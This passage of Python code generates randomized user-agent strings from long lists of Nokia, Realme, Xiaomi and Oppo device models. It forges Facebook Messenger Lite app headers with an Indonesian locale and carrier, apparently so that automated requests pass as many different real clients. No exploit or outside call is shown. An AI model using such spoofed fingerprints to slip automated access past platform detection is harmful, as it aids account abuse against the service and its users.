C2', 'Nokia C2 2nd Edition', 'Nokia C2 Tennen', 'Nokia C20', 'Nokia C20 Plus', 'Nokia C200', 'N151DL', 'Nokia C21', 'Nokia C21 Plus', 'Nokia C22', 'Nokia C3', 'Nokia C30', 'Nokia C31', 'Nokia C32', 'Nokia C5 Endi', 'Nokia G10', 'N150DL', 'Nokia G100', 'Nokia G11', 'Nokia G11 Plus', 'Nokia G20', 'Nokia G20', 'Nokia G21', 'Nokia G22', 'N1374DL', 'Nokia G400 5G', 'Nokia G50', 'Nokia G60 5G', 'Lumia 430', 'Nokia N900', 'Nokia Streaming Box 8000', 'Nokia T10', 'Nokia T20', 'Nokia T21', 'Nokia_X', 'Nokia_X', 'Nokia_X', 'Nokia X10', 'Nokia X100', 'Nokia_X2', 'NokiaX2DS', 'NokiaX2DS', 'NokiaX2DS', 'NokiaX2DS', 'Nokia X20', 'Nokia X30 5G', 'Nokia X5', 'Nokia X5', 'Nokia X6', 'Nokia X6', 'Nokia X7', 'Nokia X7', 'Nokia X71', 'Nokia_XL', 'Nokia_XL', 'Nokia_XL', 'Nokia XR20', 'Nokia XR21'])
                self.useragent = (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/Nokia;FBBD/Nokia;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')
            return (self.useragent)
        except (Exception) as e:
            self.android_version = random.choice(['9', '10', '11', '12', '13'])
            self.android_build = random.choice([
                f'RP1A.{random.randint(000000, 999999)}.0{random.randrange(11, 16)}',
                f'SP1A.{random.randint(000000, 999999)}.0{random.randrange(11, 16)}',
            ])
            self.android_model = random.choice(['RMX3661', 'RMX3687', 'RMX3686', 'RMX3241', 'RMX3388', 'RMX3472', 'RMX3471', 'RMX3393', 'RMX3392', 'RMX3612', 'RMX2202', 'RMX2121', 'RMX2176', 'RMX2052', 'RMX2075', 'RMX2076', 'RMX2144', 'RMX2111', 'RMX2200', 'RMX3092', 'RMX3093', 'RMX3042', 'RMX3041', 'RMX3125', 'RMX3122', 'RMX3121', 'RMX2205', 'RMX3161', 'RMX2205', 'RMX3396', 'RMX3572', 'RMX3242'])
            return (f'Dalvik/2.1.0 (Linux; U; Android {self.android_version}; {self.android_model} Build/{self.android_build}) [FBAN/MessengerLite;FBAV/{self.app_version};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{random.randint(00000000, 99999999)};FBCR/INDOSAT;FBMF/Realme;FBBD/Realme;FBDV/{self.android_model};FBSV/9;FBCA/{self.arm64}:null;FBDM/' + '{' + str(self.density) + '};]')

    def Android_Useragent(self):
        try:
            self.browser_version = (random.choice(['116.0.5845.172', '116.0.5845.164', '116.0.5845.163', '116.0.5845.115', '116.0.5845.114', '116.0.5845.93', '116.0.5845.92', '115.0.5790.168', '115.0.5790.166', '115.0.5790.139', '115.0.5790.138', '115.0.5790.136', '115.0.5790.85', '114.0.5735.227', '114.0.5735.226', '114.0.5735.196', '114.0.5735.147', '114.0.5735.131', '114.0.5735.130', '114.0.5735.61', '114.0.5735.60', '114.0.5735.58', '114.0.5735.57', '114.0.5735.53', '114.0.5735.52', '113.0.5672.163', '113.0.5672.162', '113.0.5672.132', '113.0.5672.131', '113.0.5672.77', '113.0.5672.76', '112.0.5615.136', '112.0.5615.135', '112.0.5615.101', '112.0.5615.100', '112.0.5615.48', '112.0.5615.47', '111.0.5563.116', '111.0.5563.115', '111.0.5563.58', '111.0.5563.57', '111.0.5563.49', '111.0.5563.48', '110.0.5481.154', '110.0.5481.153', '110.0.5481.65', '110.0.5481.64', '110.0.5481.63', '110.0.5481.61', '109.0.5414.118', '109.0.5414.117', '109.0.5414.86', '109.0.5414.85', '108.0.5359.128', '108.0.5359.79', '108.0.5359.61', '107.0.5304.141', '107.0.5304.105', '107.0.5304.91', '107.0.5304.54']))
            self.device = str(random.choice(Useragent['Device'].split(','))).capitalize()
            self.android_version = random.choice(['9', '10', '11', '12', '13'])
            if "Xiaomi" in str(self.device):
                self.android_model = random.choice(['Xiaomi 10 Pro', '2107119DC', '2107119DC', '21091116UI', '21091116UI', '2201123G', '2201123C', 'Xiaomi 12', '2203129G', 'Xiaomi 12 Lite', '2201122G', 'Xiaomi 12 Pro', '2207122MC', '2207122MC', '2206123SC', '2206122SC', 'Xiaomi 12S Pro', '2206122SC', '2203121C', '2203121C', '2203121C', '22071212AG', 'Xiaomi 12T', 'Xiaomi 12T Pro', '22081212UG', 'Xiaomi 12T Pro', '2112123AG', '2211133G', '2211133C', 'Xiaomi 13', 'Xiaomi 13', 'Xiaomi 13', '2210129SG', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', 'Xiaomi 13 Lite', '2210132C', 'Xiaomi 13 Pro', '2210132G', 'Xiaomi 13 Pro', '2210132C', 'xiaomi 6', 'xiaomi 6', 'xiaomi 8', 'SKR-H0', 'SKR-A0', 'SKW-H0', 'SKW-A0', 'DLT-H0', 'DLT-A0', 'SHARK KLE-A0', 'SHARK KLE-A0', 'Black Shark 3', 'SHARK KLE-A0', 'KLE-AO', 'SHARK KLE-H0', 'SHARK KLE-H0', 'SHARK MBU-A0', 'SHARK MBU-H0', 'SHARK MBU-H0', 'Black Shark 3S', 'SHARK PRS-H0', 'SHARK PRS-H0', 'SHARK PRS-A0', 'SHARK KSR-H0', 'SHARK KSR-A0', 'SHARK PAR-A0', 'SHARK PAR-H0', 'SHARK PAR-H0', 'SHARK KTUS-H0', 'SHARK KTUS-A0', 'SHARK KTUS-H0', 'AWM-A0', 'AWM-A0', 'AWM-A0', '2109119BC', '2109119BC', '2013023', '2013023', '2013023', '2013022', '2013022', '2013023', '2013023', '2014011', '2014011', 'id 2014011', '2014817', '2014817', '2014817', '2014817', '2014817', '2014817', '2014817', '2014818', '2014818', '2014818', '2014818', '2014818', '2014813', '2014811', '2014813', '2014811', '2014812', '2014813', '2014811', '2014813', '2014813', '2014811', '2014811', '2014501', '2014501', '2014501', 'HM NOTE 1TD', 'HM NOTE 1TD', 'Mi 10', 'Mi 10', 'Mi 10', 'M2002J9G', 'M2002J9E', 'M2002J9E', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Lite Zoom', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Pro', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'Mi 10 Ultra', 'M2007J1SC', 'M2007J1SC', 'M2007J1SC', 'M2007J17I', 'M2007J17I', 'M2102J2SC', 'M2102J2SC', 'M2102J2SC', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'Mi 10T', 'M2007J3SY', 'M2007J3SC', 'M2007J3SP', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'Mi 10T Lite', 'M2007J17G', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'Mi 10T Pro', 'M2007J3SG', 'M2011K2G', 'M2011K2C', 'Mi 11', 'Mi 11', 'M2011K2C', 'M2011K2C', 'M2101K9AG', 'M2101K9AG', 'Mi 11 Lite', '2109119DG', 'M2101K9G', 'M2101K9C', '2109119DI', 'M2102K1AC', 'M2102K1AC', 'M2102K1AC', 'M2102K1AC', 'Mi 11 Pro', 'Mi 11 Pro', 'M2102K1C', 'M2102K1C', 'M2102K1C', 'M2102K1G', 'Mi 11 Ultra', 'M2012K11G', 'Mi 11i', '21081111RG', '2107113SG', '2107113SI', 'M2012K11AI', 'M2012K11I', 'M2012K11I', 'MI 1S', 'MI 1S', 'MI 1S', 'MI 2', 'MI 2', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2A', 'MI 2S', 'MI 2S', 'MI 2S', 'MI 2S', 'MI 2SC', 'MI 2SC', 'MI 2SC', 'MI 2SC', 'MI 3', 'MI 3', 'MI 3', 'MI 30 Pro', 'MI 3C', 'MI 3C', 'MI 3C', 'MI 3W', 'MI 3W', 'MI 3W', 'Mi 4', 'MI 4', 'MI 4LTE', 'MI 4LTE', 'MI 4LTE', 'MI 4LTE', 'Mi-4c', 'Mi-4c', 'Mi-4c', 'Mi-4c', 'Mi 4i', 'Mi 4i', 'Mi 4i', 'Mi 4i', 'MI 4S', 'MI 4S', 'arm_64 MI 4S', 'MI 4S', 'MI 4W', 'MI 4W', 'MI 4W', 'MI 4W', 'MI 5', 'Mi 5', 'MI 5', 'MI 5', 'Mi 5C', 'Mi 5c', 'MI 5C', 'MI 5s', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5s Plus', 'MI 5X Flow', 'MI 5X', 'MI 5X', 'Mi 5X', 'MI 5X', 'MI 6', 'MI 6', 'MI 6', 'MI 6X', 'MI 6X', 'MI 6X', 'MI 6X', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8', 'MI 8 Lite', 'MI 8 Lite', 'MI 8 Lite', 'MI 8 Pro', 'MI 8 Pro', 'MI 8 Pro', 'MI 8 SE', 'MI 8 SE', 'MI 8 SE', 'MI 8 SE', 'MI 8 UD', 'MI 8 UD', 'MI 8 UD', 'MI 8 UD', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'MI 9', 'Mi 9 Lite', 'Mi9 Pro 5G', 'Mi 9 Pro 5G', 'MI 9 ROY', 'MI 9 SE', 'MI 9 SE', 'Mi 9 SE', 'Mi 9T', 'Mi 9T Pro', 'Mi 9X', 'Mi A1', 'mi a13', 'Mi A2', 'Mi A2 Lite', 'Mi A3', 'Mi A3', 'MI A615FN', 'MiBOX2', 'MIBOX3', 'MiBOX3_PRO', 'MIBOX4', 'Mi CC 9', 'MI CC 9', 'MI CC 9', 'MI CC9 Pro', 'Mi CC9 Pro', 'MI CC9 Pro', 'MI CC9 Pro', 'MI CC 9e', 'MI CC 9e', 'MI CC 9e', 'MI CC 9e', 'MiProjA1', 'MI MAX', 'MI MAX', 'MI MAX', 'MI MAX', 'Mi Max', 'MI MAX', 'MI MAX 2', 'XIAOMI MI MAX 2', 'MI MAX 2', 'MI MAX 2', 'Mi Max 2', 'MI MAX 3', 'MI MAX 3', 'Mi Max 3', 'MIX', 'MIX', 'MIX Lite', 'MIX', 'Mix Plus', 'MIX 2', 'MIX 2', 'MIX 2', 'Mi MIX 2', 'MIX 2', 'Mi MIX 2S', 'MIX 2S', 'MIX 2S', 'MIX 2S', 'MIX 2S', 'Mi MIX 2S', 'Mi MIX 3', 'MIX 3', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', 'Mi MIX 3 5G', '2106118C', '2106118C', 'M2011J18C', 'M2011J18C', 'M2011J18C', 'M2011J18C', 'Mi Note 10', 'Mi Note 10 Lite', 'Mi Note 10 Pro', 'Mi Note 11', 'Mi Note 2', 'MI Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 2', 'Mi Note 3', 'Mi Note 8 Pro', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE LTE', 'MI NOTE Pro', 'Mi Note Pro', 'MI NOTE Pro', 'MI NOTE Pro', 'MI NOTE Pro', 'Mi Note10 Pro', 'Mi Note5', 'MI-ONE', 'MI-ONE C1', 'MI-ONEPlus', 'MI-ONE Plus', 'Mi Pad 4Plus', 'MI PAD', 'MI PAD 2', 'MI PAD 2', 'MiPad 3', 'MI PAD 3', 'MI PAD 4', 'MI PAD 4 PLUS', 'MI PAD 4 PLUS', 'Xiaomi Pad 5', 'Xiaomi Pad 5', '21051182G', '21051182C', 'Xiaomi Pad 5', 'M2105K81AC', 'M2105K81AC', 'M2105K81AC', '22081281AC', 'M2105K81C', 'M2105K81C', 'Mi Pad4 Wi-Fi', 'Mi Pad5 Wi-Fi', 'MI PLAY', 'MI PLAY Flow', 'MI PLAY', 'MI PLAY', 'MI PLAY', 'MI XL', 'Xiaomi Mi5', 'MiTV-AXSO0', 'MiTV4A', 'MiTV4-ANSM0', 'MiTV-MSSP0', 'MiTV-AXSO1', 'MiTV-AXSO2', 'MiTV4C', 'MiTV4I', 'MiTV4I', 'MiTV-MSSP2', 'MiTV-MSSP1', 'MiTV-MSSP3', 'MiTV-MOOQ0', 'MiTV-MOOQ0', 'MiTV-MTEQ0', 'MiTV-AESP0', 'MiTV-AYFR0', 'MiTV-ANSP0', 'MiTV-ANSP0', '22061218C', '22061218C', '22061218C', '22061218C', '22061218C', '2209116AG', 'POCOPHONE F1', 'POCO F1', 'Qin 1s+', 'Qin 2', 'QIN2 Pro', 'Qin 2 Pro', 'Redmi 01A', 'HM 1', '21061119DG', '220333QBI', 'Redmi 10', 'Redmi 10', '21061119AG', '21121119SG', '22011119UY', '22041219NY', '22041219G', 'Redmi 10 5G', '21061119BI', '22011119TI', '22041219I', '220233L2G', '220233L2I', '220333QNY', '220333QAG', '220333QL', 'Redmi 10I', 'Redmi 10S', 'M2004J7AC', 'M2004J7AC', 'M2004J7AC', 'M2004J15SC', 'M2004J7BC', 'M2004J7BC', 'M2004J7BC', 'Redmi 11 Lite', 'Redmi 11 lite', '22071219AI', '22071219AI', 'Redmi 11X', 'Redmi 12 5G', 'Redmi 12', '22120RN86G', '22126RN91Y', 'Redmi 12C', '2212ARNC4L', 'Redmi 12C', 'HM 1S', 'HM 1SW', 'Redmi 1S', 'HM 1SW', 'HM 1SC', 'HM 1S', 'HM 1S', 'HM 1S', 'HM 1S', 'HM 1SW', 'wt88047', 'Redmi 2', 'Redmi 2 Prime', 'wt88047', 'wt88047', 'HM 2A', 'HM 2A', 'HM 2A', 'Redmi 3', 'Redmi 3', 'Redmi 3', 'Redmi 3', 'Redmi 3S', 'Redmi 3S', 'Redmi 3S', 'Redmi 3X', 'Redmi 3X', 'Redmi 3X', 'Redmi 3X', 'Redmi 4', 'Redmi 4 Prime', 'Redmi 4 Pro', 'Redmi 4 Pro', 'Redmi 41224', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5 Plus', 'Redmi 5 Plus', 'Redmi 5 pro', 'Redmi 5A', 'Redmi 5pro', 'Redmi 5S', 'Redmi 6', 'Redmi 6', 'Redmi 6', 'Redmi 6 Pro', 'Redmi 6 Pro', 'Redmi 6A', 'Redmi 7', 'Redmi 7 Pro', 'Redmi 7A', 'Redmi 7A', 'Redmi 7I', 'Redmi 7i', 'Redmi 8', 'Redmi 85781', 'Redmi 8A', 'Redmi 8A Dual', 'Redmi 8A Pro', 'Redmi 8A Pro', 'Redmi 8A Pro', 'Redmi 8A Pro', 'M2004J19C', 'M2010J19SI', 'Redmi 9 Power', 'Redmi 9 Prime', 'Redmi 9 Prime', 'Redmi 9 Pro', 'Redmi 99070', 'M2006C3LG', 'M2006C3LI', 'M2006C3LVG', 'M2006C3MG', 'M2006C3MT', 'M2006C3MNG', 'M2006C3LII', 'Redmi 9i', 'Redmi 9Prime', 'Redmi 9pro', 'M2010J19SY', 'M2010J19SG', 'M2010J19SL', 'Redmi 9T NFC', '220733SG', '220733SL', '220733SFG', '23028RN4DG', '23028RNCAG', 'Redmi A3', 'Redmi A8', 'Redmi A90', 'Redmi Go', 'Redmi K20', 'Redmi K20', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K20 Pro', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 5G', 'Redmi K30 Pro', 'Redmi K30 Pro', 'M2006J10C', 'M2006J10C', 'M2006J10C', 'M2006J10C', 'Redmi K30i 5G', 'Redmi K30i 5G', 'Redmi K30i 5G', 'Redmi K30i 5G', 'M2012K11AC', 'M2012K11AC', 'M2012K11AC', 'M2012K10C', 'M2012K10C', 'M2012K10C', 'M2012K11C', 'M2012K11C', 'M2012K11C', '22021211RC', '22021211RC', '22041211AC', '22041211AC', '22041211AC', '22041211AC', '22041211AC', '22011211C', '22011211C', '22011211C', '21121210C', '21121210C', '21121210C', '21121210C', '22041216I', '23013RK75C', '23013RK75C', 'Redmi K60', '22127RK46C', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'HM NOTE 1W', 'M2101K7AG', 'M2101K7AI', 'M2103K19G', 'M2103K19C', 'XIG02', 'M2101K6G', 'M2104K10AC', 'M2101K6R', 'M2101K7BG', 'M2101K7BNY', 'M2101K7BL', 'M2101K7BI', '22021119KR', 'M2103K19Y', 'Redmi Note 10T', 'M2103K19I', 'A101XM', 'M2003J15SC', 'M2003J15SC', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', 'Redmi Note 11', '2201117TY', '2201117TG', '2201117TI', '2201117TL', '21091116AC', '21091116AC', '21091116AC', '2201116TG', '21091116C', '2201116TI', '2201116TG', '21091116C', '2201116SG', '2201116SR', '21091116UG', '21091116UC', '2201116SI', '22087RA4DI', '22087RA4DI', '22041219C', '22041219C', 'Redmi Note 11E', '2201116SC', 'Redmi Note 11R', 'Redmi Note 11R', '22095RA98C', '2201117SL', '2201117SY', '2201117SI', '2201117SG', '22031116BG', '21091116I', '21091116AI', '22041216C', '22041216C', '22041216C', '22041216C', '22041216C', '22041216UC', '22041216UC', '22041216UC', '22111317G', '23021RAAEG', '23021RAA2Y', 'Redmi Note 12', 'Redmi Note 12', 'Redmi Note 12', '22101316UP', '22101316G', '22101316I', '22101316C', '22101316C', '22101316UC', '22101316UCP', '22101316UCP', '22101316UCP', '22101316UCP', '22101316UG', '2303CRA44A', 'Redmi Note 12S', '23030RAC7Y', 'Redmi Note 12S', 'Redmi Note 12S', 'Redmi Note 12S', '23049RAD8C', '23049RAD8C', '23049RAD8C', 'Redmi Note 13', 'Redmi Note 1LTE', 'Redmi Note 2', 'Redmi Note 2', 'Redmi Note 27', 'Redmi Note 3', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4', 'Redmi Note 4', 'Redmi Note 4A', 'HM NOTE 1S', 'HM NOTE 1S', 'HM NOTE 1S', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'HM NOTE 1LTE', 'HM NOTE 1LTE', 'HM NOTE 1LTE', 'HM NOTE 1LTEW', 'Redmi Note 4X', 'Redmi Note 4X', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5', 'Redmi Note 5A', 'Redmi note 6', 'redmi note 6', 'Redmi Note 6Pro', 'Redmi Note 7', 'Redmi Note 7', 'Redmi Note 7S', 'Redmi Note 7S', 'M1901F71', 'Redmi Note 7S', 'Redmi Note 8', 'Redmi Note 8', 'M1908C3JGG', 'M1908C3JGG', 'Redmi Note 8T', 'Redmi Note 9', 'M2010J19SC', 'M2010J19SC', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'Redmi Note 9', 'M2007J22C', 'M2007J22C', 'M2007J22C', 'M2007J22C', 'M2007J17C', 'M2007J17C', 'M2007J17C', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'Redmi Note 9T', 'M2007J22G', 'A001XM', 'Redmi Note10 JE', 'Redmi Note7', 'Redmi Note8', 'Redmi Note8T', '22081283G', '22081283C', 'Redmi Pad', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi Pro', 'Redmi S2', 'Redmi S2', 'Redmi S2', 'Redmi S2', 'Redmi X', 'Redmi Y1', 'Redmi Y1', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y1 Lite', 'Redmi Y1 Lite', 'Redmi Y2', 'Redmi Y3', 'Redmi Y3'])
                self.build = (f"{random.choice(['TKQ1', 'SKQ1', 'RKQ1', 'RP1A'])}.{random.randrange(210000, 220000)}.00{random.randrange(1, 9)}{random.choice(['', '; wv'])}")
                self.useragent = (f'Mozilla/5.0 (Linux; Android {self.android_version}; {self.android_model} Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{self.browser_version} Mobile Safari/537.36')
            elif "Windows" in str(self.device):
                self.byte = random.choice(['Win64; x64', 'Win32; x86'])
                self.windows = (f'Mozilla/5.0 (Windows NT 10.0; {self.byte}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{self.browser_version} Safari/537.36')

                self.ubuntu_version = random.choice(['Ubuntu 20.10', 'U', 'Ubuntu 15.04', 'Ubuntu/15.10'])
                self.byte = random.choice(['Linux armv7l', 'Linux x86_64', 'Linux i686'])
                self.ubuntu = (f'Mozilla/5.0 (X11; {self.ubuntu_version}; {self.byte}) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/{self.browser_version} Chrome/{self.browser_version} Safari/537.36')
                self.useragent = random.choice([self.windows, self.ubuntu])
            elif "Oppo" in str(self.device):
                self.android_model = random.choice(['OPPO 1105', 'oppo 15', 'Oppo 3T', 'Oppo 62A', 'oppo6779', 'oppo6833', 'OPPO7273', 'Oppo 9A', 'Oppo A1', 'PHQ110', 'PHQ110', 'PCHM10', 'PCHM10', 'PCHM10', 'PCHM10', 'CPH2071', 'PCHT30', 'PCHM00', 'CPH2083', 'CPH2083', 'CPH2083', 'CPH2185', 'CPH2179', 'CPH2269', 'CPH2421', 'CPH2349', 'CPH2271', 'CPH2477', 'CPH2471', 'CPH2471', 'CPH1923', 'CPH1923', 'CPH1923', 'CPH1923', 'CPH1925', 'oppo A25', 'CPH1837', 'PADT00', 'PADM00', 'CPH1837', 'PADM00', 'OPPO A30', 'OPPO A30', 'OPPO A30', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'OB-OPPO A31c', 'PDVM00', 'PDVM00', 'PDVM00', 'PDVM00', 'CPH2137', 'OPPO A33', 'OPPO A33m', 'OPPO A33t', 'OPPO A34', 'Oppo A34', 'PEFM00', 'PEFM00', 'PEFM00', 'PEFM00', 'PESM10', 'PESM10', 'PESM10', 'PESM10', 'OPPO A36', 'OPPO A37m', 'OPPO A37f', 'A37fw', 'OPPO A37t', 'OPPO A37t', 'OPPO A38', 'CPH1605', 'CPH1605', 'CPH1803', 'OPPO CPH1803', 'OPPO CPH1803', 'OPPO PBBM30', 'CPH1803', 'CPH1853', 'Oppo A4', 'OPPO A40', 'Oppo A400', 'OPPO A41', 'OPPO A42', 'OPPO A43', 'Oppo A43', 'OPPO A44', 'OPPO A45', 'Oppo A45', 'OPPO A46', 'OPPO A47', 'OPPO A48', 'OPPO A49', 'OPPO PBBT30', 'PBAM00', 'CPH1809', 'OPPO PBAT00', 'OPPO PBAM00', 'PBAM00', 'CPH1809', 'CPH1809', 'OPPO PBAM00', 'PBAT00', 'CPH1931', 'CPH1933', 'OPPO A50', 'OPPO A51', 'oppo A51', 'CPH2069', 'CPH2061', 'CPH2061', 'CPH2127', 'CPH2139', 'PECM20', 'PECT30', 'PECM30', 'PECM30', 'OPPO A53m', 'OPPO A53m', 'OPPO A53m', 'CPH2135', 'CPH2321', 'CPH2239', 'CPH2239', 'CPH2195', 'OPG02', 'CPH2273', 'CPH2325', 'PEMT20', 'PEMM20', 'PEMT00', 'PEMM00', 'PEMM00', 'PEMM20', 'PEMM00', 'PEMM20', 'A102OP', 'CPH2309', 'OPPO A56', 'PFVM10', 'PFVM10', 'CPH2407', 'OPPO A57', 'CPH1701', 'OPPO A57', 'CPH1701', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'CPH2387', 'PHJ110', 'PHJ110', 'PHJ110', 'PHJ110', 'PHJ110', 'OPPO A59', 'OPPO A59m', 'OPPO A59m', 'OPPO A59s', 'OPPO A59S', 'OPPO A59s', 'OPPO A59st', 'OPPO A59t', 'CPH1909', 'CPH1901', 'OPPO PBFT00', 'OPPO PBFM00', 'CPH1717', 'CPH1801', 'CPH1801', 'Oppo A71A', 'CPH2067', 'PDYM20', 'PDYM10', 'PDYT10', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'CPH2161', 'CPH2099', 'OPPO A73t', 'OPPO A73t', 'OPPO A73t', 'CPH2219', 'OPPO CPH2219', 'CPH2197', 'CPH2263', 'CPH2375', 'CPH1715', 'OPPO A77', 'CPH2339', 'CPH2385', 'CPH2473', 'OPPO A77t', 'OPPO A77t', 'OPPO A77t', 'OPPO A77t', 'CPH2483', 'OPPO A79', 'OPPO A79', 'OPPO A79kt', 'OPPO A79', 'OPPO A79k', 'OPPO A79k', 'OPPO A79t', 'OPPO A79t', 'OPPO A79t', 'OPPO A79t', 'PCDM00', 'OPPO PCDM00', 'PCDM00', 'PCDM00', 'PCDT00', 'PBBM00', 'PBBM00', 'PBBM00', 'PBBT00', 'PDBM00', 'PDBM00', 'PDBM00', 'PDBM00', 'OPPO A83', 'CPH1729', 'OPPO A83', 'CPH1827', 'CPH1827', 'OPPO A83t', 'OPPO A83t', 'OPPO A83t', 'PCAM10', 'PCAM10', 'PCAM10', 'CPH1938', 'PCAT10', 'PCAM10', 'CPH1938', 'CPH1937', 'CPH1941', 'CPH2001', 'CPH2021', 'PCPM00', 'CPH2001', 'CPH2001', 'CPH2001', 'CPH2001', 'CPH2059', 'PDKT00', 'PDKM00', 'PDKT00', 'PDKT00', 'PDKM00', 'CPH2121', 'PEHM00', 'CPH2123', 'PFGM00', 'PFGM00', 'PFGM00', 'CPH2203', 'CPH2333', 'CPH2365', 'PHA120', 'PHA120', 'OPPO A96', 'PFUM10', 'PFUM10', 'PFUM10', 'PFTM10', 'PFTM10', 'Oppo A98', 'PCEM00', 'PCEM00', 'PCET00', 'CPH1851', 'CPH1920', 'CPH1903', 'A1603', 'OPPOCNM632', 'CPH1114', 'CPH1235', 'CPH1451', 'CPH1615', 'CPH1664', 'CPH1869', 'CPH1869', 'CPH1929', 'CPH1985', 'CPH2048', 'CPH2048', 'CPH2048', 'CPH2107', 'CPH2238', 'CPH2332', 'CPH2351', 'CPH2389', 'CPH2419', 'CPH2451', 'CPH2465', 'CPH2467', 'CPH2529', 'CPH2531', 'CPH2531', 'CPH2589', 'CPH2643', 'CPH3475', 'CPH3669', 'CPH3682', 'CPH3731', 'CPH3776', 'CPH3785', 'CPH4125', 'CPH4275', 'CPH4299', 'CPH4395', 'CPH4473', 'CPH4987', 'CPH5286', 'CPH5841', 'CPH5947', 'CPH6178', 'CPH6244', 'CPH6271', 'CPH6316', 'CPH6519', 'CPH6528', 'CPH6697', 'CPH7338', 'CPH7364', 'CPH7382', 'CPH7532', 'CPH7577', 'CPH7991', 'CPH8153', 'CPH8346', 'CPH8347', 'CPH8363', 'CPH8393', 'CPH8467', 'CPH8472', 'CPH8534', 'CPH8686', 'CPH8893', 'CPH9177', 'CPH9226', 'CPH9659', 'CPH9667', 'CPH9716', 'CPH9763', 'CPH9929', 'oppo f 5 plus', 'OPPO F1 Plus', 'Oppo F1', 'Oppo F1', 'X9009', 'OPPO R9m', 'X9009', 'Oppo F10', 'CPH1911', 'CPH1969', 'Oppo F11Pro', 'CPH2095', 'CPH2119', 'OPPO F19', 'Oppo F19', 'CPH2285', 'CPH2285', 'CPH2213', 'CPH2213', 'CPH2223', 'A1601', 'OPPO F1s', 'OPPO F1s', 'A1601', 'CPH2341', 'CPH2461', 'CPH2455', 'CPH2461', 'CPH2455', 'CPH2527', 'CPH1609', 'CPH1609', 'CPH1609', 'CPH1613', 'CPH1727', 'CPH1723', 'CPH1727', 'CPH1723', 'CPH1723', 'CPH1725', 'CPH1725', 'Oppo F51', 'Oppo F61 Pro', 'CPH1819', 'CPH1821', 'CPH1819 Flow', 'CPH1881', 'CPH1825', 'CPH1825', 'CPH1881', 'CPH1881', 'CPH1825', 'CPH1881', 'CPH1823', 'X909', 'X909', 'R827T', 'R827T', 'R827', 'X9076', 'X9077', 'X9070', 'X9077', 'X9076', 'X9077', 'X9006', 'X9007', 'X9000', 'X9007', 'X9006', 'X9006', 'R815W', 'R815T', 'R815', 'R8111', 'OPPOR8111', 'R821T', 'R821', 'R821', 'PEUM00', 'PEUM00', 'PEUM00', 'PEUM00', 'PGU110', 'PGU110', 'CPH2437', 'PGT110', 'U707T', 'PAFM00', 'CPH1875', 'PAFT00', 'CPH1871', 'PAHM00', 'PAHM00', 'PAHM00', 'PAHM00', 'CPH2023', 'PDEM10', 'CPH2005', 'CPH2025', 'Find X2 Pro', 